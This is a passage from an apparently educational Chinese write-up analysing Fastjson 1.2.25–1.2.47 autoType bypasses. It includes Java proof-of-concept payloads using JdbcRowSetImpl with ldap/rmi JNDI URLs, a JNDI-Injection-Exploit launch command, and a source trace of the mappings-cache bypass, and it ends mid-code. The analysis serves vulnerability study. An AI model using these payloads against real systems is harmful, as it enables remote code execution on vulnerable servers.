src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680617239373-2a161464-b3a1-4d3f-8f8f-b4dc523ffe2a.png#averageHue=%231a1717&clientId=u8272b843-0f56-4&from=paste&height=268&id=u7e19c58f&name=image.png&originHeight=335&originWidth=1479&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51934&status=done&style=none&taskId=u05bf2652-312e-4b63-b411-b1aa678099a&title=&width=1183.2" alt="image.png"><br>然后在<code>Main.py</code>中写入如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ppcjug\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680614580975-c77c8c3e-f26e-44bc-b944-bdb28504da0f.png#averageHue=%23f7f6f5&clientId=u8272b843-0f56-4&from=paste&height=818&id=u4433d1f9&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=242676&status=done&style=none&taskId=u5559770c-6f78-4d2b-8f00-46a2a5cfea4&title=&width=1536" alt="image.png"><br>以上为第一种<code>poc</code>，在<code>JDK 8u181</code>下使用<code>ldap</code>测试成功，使用<code>rmi</code>测试失败。<br>除此之外，另一种<code>poc</code>则需要满足漏洞利用条件为<code>JDK 6u113</code>、<code>7u97</code> 和 <code>8u77</code>之前，例如我们这里重新新建一个项目，并从<code>[https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html)</code>处下载<code>jdk-8u65-windows-x64.exe</code>并安装。<br>然后利用新安装的<code>jdk 8u65</code>来启动<code>jndi exploit</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\Program Files\Java\jdk1.8.0_65\bin\java.exe&quot;</span> -jar .\JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -A <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -C <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure><p>导入<code>fastjson1.2.25</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson_8u66_1_2_25&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;<span class="number">8</span>&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;<span class="number">8</span>&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-<span class="number">8</span>&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span><span class="number">.25</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure><p>在<code>Main.java</code>中写入如下内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680692205068-d02f1d33-8459-4a31-a147-4cd5f3231b17.png#averageHue=%23f7f6f3&clientId=u8272b843-0f56-4&from=paste&height=823&id=ud8a5b648&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=258463&status=done&style=none&taskId=ua35ae797-9813-4f96-a233-755d5bd49e7&title=&width=1536" alt="image.png"></p><h3 id="（3）对两种poc绕过手法的分析"><a href="#（3）对两种poc绕过手法的分析" class="headerlink" title="（3）对两种poc绕过手法的分析"></a>（3）对两种poc绕过手法的分析</h3><p>首先来说说限制，基于<code>JNDI+RMI</code>或<code>JDNI+LADP</code>进行攻击，会有一定的<code>JDK</code>版本限制。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113</span><br><span class="line">LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680618501501-f26961a1-0027-40a3-ade6-8415e2b1c2d4.png#averageHue=%2395c7f8&clientId=u8272b843-0f56-4&from=paste&id=u043dac77&name=image.png&originHeight=441&originWidth=1250&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=153472&status=done&style=none&taskId=u5a11668f-49db-4182-92da-4147872a394&title=" alt="image.png"></p><h4 id="①第一种poc（1-2-25-1-2-47通杀！！！）"><a href="#①第一种poc（1-2-25-1-2-47通杀！！！）" class="headerlink" title="①第一种poc（1.2.25-1.2.47通杀！！！）"></a>①第一种poc（1.2.25-1.2.47通杀！！！）</h4><p>然后我们先来看<strong>第一种</strong><code>poc</code>。<br>我们仔细欣赏下第一种<code>poc</code>的<code>payload</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;a&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="string">&quot;b&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1/exp&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>我们会发现，加上<code>&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;</code>就会绕过原本的<code>autoType</code>，由此我们可以猜测，针对未开启<code>autoType</code>的情况，<code>fastjson</code>的源代码中应该是有相关方法去针对处理的，并且利用我们的这种方式，正好可以对应上。<br>于是我们直接去查看源代码，翻到<code>checkAutoType</code>的地方，可以看到，如果没开启<code>autoType</code>，就会有以下两种加载方式：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680674920966-732fd782-4668-43e1-ab57-518011562ee9.png#averageHue=%23f9f6f4&clientId=u8272b843-0f56-4&from=paste&height=818&id=u0e63a7b2&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=222886&status=done&style=none&taskId=uc25d8b68-2fa3-4f6f-b967-be1c558c509&title=&width=1536" alt="image.png"><br>第一种是从<code>mappings</code>里面获取，也就是上图中的第<code>727</code>行代码，点进去之后可以看到：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680675503367-43dbf581-5b0e-4015-a487-80393adc3525.png#averageHue=%23f9f7f5&clientId=u8272b843-0f56-4&from=paste&height=814&id=u23c92503&name=image.png&originHeight=1018&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235656&status=done&style=none&taskId=udb00512b-97b5-4dc2-a17c-9a854e30dcd&title=&width=1536" alt="image.png"><br>如果获取不到就采用第二种方法，也就是第<code>728</code>-<code>730</code>行代码，从<code>deserializers</code>中获取。<br><code>deserializers</code>是什么呢？可以看<code>fastjson-1.2.25.jar!\com\alibaba\fastjson\parser\ParserConfig.class</code>的第<code>172</code>-<code>241</code>行，里面是内置的一些类和对应的反序列化器。<br>但是<code>deserializers</code>是<code>private</code>类型的，我们搜索<code>deserializers.put</code>，发现当前类里面有一个<code>public</code>的<code>putDeserializer</code>方法，可以向<code>deserializers</code>中添加新数据：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680676108771-e490841e-0441-414e-9c9b-6576ab7d68ee.png#averageHue=%23f9f7f5&clientId=u8272b843-0f56-4&from=paste&height=818&id=u3c907910&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216672&status=done&style=none&taskId=u7c1f0f64-f171-454a-b4f5-c10d8f20685&title=&width=1536" alt="image.png"><br>于是我们全局搜索该方法，发现就一个地方调用了，而且没办法寻找利用链：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680677151929-7f9c95c7-40f3-42b7-9aa2-6aa9006a3203.png#averageHue=%23f5f1eb&clientId=u8272b843-0f56-4&from=paste&height=254&id=u1e390450&name=image.png&originHeight=318&originWidth=1141&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54312&status=done&style=none&taskId=u5ae08ae6-959f-44c7-988e-868b4e1c830&title=&width=912.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680677222460-54192f2d-d247-480a-bc53-a1212febd02f.png#averageHue=%23f9f7f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=ub9d96a5b&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=207736&status=done&style=none&taskId=u5bc96a3b-66e7-4e77-90cf-cb36de10fb1&title=&width=1536" alt="image.png"><br>所以继续看第一种方法，从<code>mappings</code>获取的。可以看到，<code>mappings</code>这里也是<code>private</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678056676-759e117f-c793-4b66-a991-82536a9233df.png#averageHue=%23f9f7f4&clientId=u8272b843-0f56-4&from=paste&height=815&id=uab06c50b&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235080&status=done&style=none&taskId=u63292f58-ebad-4aa1-af92-dddaba04808&title=&width=1536" alt="image.png"><br>搜索<code>mappings.put</code>，可以看到在<code>TypeUtils.loadClass</code>中有调用到：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678132990-8ab3025b-3eae-41c2-8576-5ec4e2151e55.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=819&id=uf9087d28&name=image.png&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210200&status=done&style=none&taskId=uaf540557-27de-4b01-9810-0fedd3a39be&title=&width=1536" alt="image.png"><br>于是我们全局搜索，可以看到有如下五处调用：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678561460-ac869226-ef1c-46f8-b492-c66e23b48473.png#averageHue=%23f5f4eb&clientId=u8272b843-0f56-4&from=paste&height=510&id=u3fb653f7&name=image.png&originHeight=637&originWidth=729&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75537&status=done&style=none&taskId=ub8b45843-0788-4a52-9ff4-b9ff2a8adc5&title=&width=583.2" alt="image.png"><br>我们一个个看。<br>第一个需要开启<code>autoType</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678666460-57c58d66-de2a-4cd8-91bc-3fd69a58362e.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=u10196591&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210453&status=done&style=none&taskId=u62527907-6716-41f7-b11b-cd1901f3082&title=&width=1536" alt="image.png"><br>第二个要在白名单内，第三个要开启<code>autoType</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678713501-12502876-12ea-4865-bb64-51340931e820.png#averageHue=%23f9f6f4&clientId=u8272b843-0f56-4&from=paste&height=819&id=u866091a0&name=image.png&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232619&status=done&style=none&taskId=u6cabfd27-4e98-4df7-b4c1-0d0d5a9f720&title=&width=1536" alt="image.png"><br>第四个是在<code>MiscCodec.deserialze</code>中的，貌似没什么限制，我们先放一边：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680678935307-61f42cbd-c46e-4ce1-aa11-e0d0797b376f.png#averageHue=%23faf8f8&clientId=u8272b843-0f56-4&from=paste&height=1213&id=u5b431c62&name=image.png&originHeight=1516&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=264604&status=done&style=none&taskId=uf5db69ca-015c-4266-988f-b07ed99f6c1&title=&width=1534.4" alt="image.png"><br>第五个没办法利用，因为传不了参数，跳过：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679092354-59713c7a-a43d-4311-8f8e-eebb3ae03c5e.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=815&id=u843988d3&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=229811&status=done&style=none&taskId=u050bb634-6bbe-46f8-a87a-6e53a20ccfb&title=&width=1536" alt="image.png"><br>也就是说，只能从<code>MiscCodec.deserialze</code>这里来寻找突破口了。<br>翻到<code>MiscCodec.java</code>的最上面可以看到，这个<code>MiscCodec</code>是继承了<code>ObjectSerializer</code>和<code>ObjectDeserializer</code>的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679361943-4d3b8440-1d46-4762-b83b-d5db888b7d58.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=817&id=uba10225d&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=202138&status=done&style=none&taskId=ue202d417-765f-4a06-8fb7-d0b507c2102&title=&width=1536" alt="image.png"><br>因此，可以判断，这个<code>MiscCodec</code>应该是个反序列化器，于是我们去之前的<code>deserializers</code>中看看都有谁用了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679573424-d52e1ab6-6e6a-466d-bb4b-5cd24e2c7720.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=815&id=ucb42f24b&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=324362&status=done&style=none&taskId=u19623da7-4382-436c-8e01-4b27e8b2da2&title=&width=1536" alt="image.png"><br>挺多的，结合<code>MiscCodec</code>中一堆的<code>if</code>语句，可以判断，一些简单的类都被放在这里了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680679621524-a1120b62-9948-44ba-a094-b3980e929f20.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=823&id=u0a81269b&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=196030&status=done&style=none&taskId=uaeae7b27-9ad8-40bd-9aa5-4ec45805273&title=&width=1536" alt="image.png"><br>我们再来看这行代码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680681095147-04871de3-d1b0-44e1-b6e7-b790e436c355.png#averageHue=%23f9f7f0&clientId=u8272b843-0f56-4&from=paste&height=798&id=u885c1731&name=image.png&originHeight=997&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=225172&status=done&style=none&taskId=u9068ac2d-dcc5-496e-b140-f277d1f3b1f&title=&width=1536" alt="image.png"><br>然后跟进<code>strVal</code>，看看是哪儿来的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680684014235-07a14705-5567-47ff-be0d-2a24462aff8f.png#averageHue=%23f9f8f2&clientId=u8272b843-0f56-4&from=paste&height=818&id=u11950ef5&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=219653&status=done&style=none&taskId=u58d97716-591e-45dc-b0b1-383a44c1c65&title=&width=1536" alt="image.png"><br>继续跟进这个<code>objVal</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680684044565-316ed393-8cf7-40e6-8369-91ce95e250a4.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=817&id=u4942bea9&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=226587&status=done&style=none&taskId=u32a3cea6-c753-46c3-aff4-d787d4b28c0&title=&width=1536" alt="image.png"><br>到这里就很明显了，那红框中的这段代码是什么意思呢？<br>首先，代码中的<code>if</code>语句判断当前解析器的状态是否为<code>TypeNameRedirect</code>，如果是，则进入<code>if</code>语句块中进行进一步的解析。在<code>if</code>语句块中，首先将解析器的状态设置为<code>NONE</code>，然后使用<code>parser.accept(JSONToken.COMMA)</code>方法接受一个逗号<code>Token</code>，以便后续的解析器对其进行处理。接下来，使用<code>lexer.token()</code>方法判断下一个<code>Token</code>的类型，如果是一个字符串，则进入if语句块中进行进一步的判断。在if语句块中，使用<code>lexer.stringVal()</code>方法获取当前<code>Token</code>的字符串值，并与<code>val</code>进行比较。如果不相等，则抛出一个<code>JSON</code>异常；如果相等，则使用<code>lexer.nextToken()</code>方法将<code>lexer</code>的指针指向下一个<code>Token</code>，然后使用<code>parser.accept(JSONToken.COLON)</code>方法接受一个冒号<code>Token</code>，以便后续的解析器对其进行处理。最后，使用<code>parser.parse()</code>方法解析当前<code>Token</code>，并将解析结果赋值给<code>objVal</code>。如果当前<code>Token</code>不是一个对象的结束符（右花括号），则使用<code>parser.accept(JSONToken.RBRACE)</code>方法接受一个右花括号<code>Token</code>，以便后续的解析器对其进行处理。如果当前解析器的状态不是<code>TypeNameRedirect</code>，则直接使用<code>parser.parse()</code>方法解析当前<code>Token</code>，并将解析结果赋值给<code>objVal</code>。<br>根据之前分析的，<code>objVal</code>会传给<code>strVal</code>，然后<code>TypeUtils.loadClass</code>在执行的过程中，会把<code>strVal</code>放到<code>mappings</code>缓存中。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680685220463-5e90e5ba-37f1-4fc1-b70e-70ccab72fc25.png#averageHue=%23fbfaf6&clientId=u8272b843-0f56-4&from=paste&height=83&id=u6a8d9b02&name=image.png&originHeight=104&originWidth=939&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14724&status=done&style=none&taskId=udd9cf6cb-81e3-4dea-a331-08d782f5c53&title=&width=751.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680686190404-6b1a2f02-0b09-4c96-ade4-0a593f179ae0.png#averageHue=%23f9f8f3&clientId=u8272b843-0f56-4&from=paste&height=832&id=u88a62e2c&name=image.png&originHeight=1040&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=221198&status=done&style=none&taskId=ua7860cce-d16a-45f6-b3ff-dbc9cc39e09&title=&width=1536" alt="image.png"><br>加载到缓存中以后，在下一次<code>checkAutoType</code>的时候，直接就返回了，绕过了检验的部分直接执行：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680686570779-d1530da3-d33d-4445-ac30-aca768ef8c78.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=818&id=u1fc011e7&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=240527&status=done&style=none&taskId=ue054fb0f-6d71-41fe-a1c3-d50aca03796&title=&width=1536" alt="image.png"></p><h4 id="②第二种poc"><a href="#②第二种poc" class="headerlink" title="②第二种poc"></a>②第二种poc</h4><p>第二种<code>poc</code>的绕过手法在上面的“黑白名单机制介绍”中已经写的很清楚了，直接参考即可。<br>需要注意的是，由于代码是循环去掉<code>L</code>和<code>;</code>的，所以我们不一定只在头尾各加一个<code>L</code>和<code>;</code>。<br>由于1.2.25的代码中有如下代码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680707261437-1f39a0de-3978-4950-90bd-ec8832701c83.png#averageHue=%23f9f7f6&clientId=u8272b843-0f56-4&from=paste&height=819&id=u10bf0ebc&name=image.png&originHeight=1024&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=228052&status=done&style=none&taskId=u174e90ae-3a98-41a5-95c0-f8d68c6a1d8&title=&width=1535.2" alt="image.png"><br>因此我们可以构造如下<code>poc</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以绕过：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680707199621-7543e63d-9d09-49ec-b393-dd53f474167c.png#averageHue=%23f7f6f4&clientId=u8272b843-0f56-4&from=paste&height=823&id=ub2bbcd38&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=249063&status=done&style=none&taskId=u898cebbe-9534-4434-bdf4-00572e66baa&title=&width=1536" alt="image.png"></p><h3 id="（4）关于JdbcRowSetImpl链利用的分析"><a href="#（4）关于JdbcRowSetImpl链利用的分析" class="headerlink" title="（4）关于JdbcRowSetImpl链利用的分析"></a>（4）关于JdbcRowSetImpl链利用的分析</h3><p>从上面我们学习了绕过黑白名单的学习，接下来看<code>JdbcRowSetImpl</code>利用链的原理。<br>根据<code>FastJson</code>反序列化漏洞原理，<code>FastJson</code>将<code>JSON</code>字符串反序列化到指定的<code>Java</code>类时，会调用目标类的<code>getter</code>、<code>setter</code>等方法。<code>JdbcRowSetImpl</code>类的<code>setAutoCommit()</code>会调用<code>connect()</code>方法，<code>connect()</code>函数如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680703249472-7e9a45dd-3070-4406-a6da-47f43f419fa3.png#averageHue=%23f8f7f4&clientId=u8272b843-0f56-4&from=paste&height=814&id=uc91bdc8b&name=image.png&originHeight=1018&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=208033&status=done&style=none&taskId=ufaf4f9a4-8120-49d5-86d6-b40ceb8fea4&title=&width=1535.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680703278497-77fe86b9-cb73-4eff-9283-9627c8038964.png#averageHue=%23f8f4d5&clientId=u8272b843-0f56-4&from=paste&height=814&id=ub640fc04&name=image.png&originHeight=1018&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235897&status=done&style=none&taskId=uaf7d108c-c2a7-4c49-94ad-64ab7612335&title=&width=1536" alt="image.png"><br>我们把这段代码单独拿出来分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span 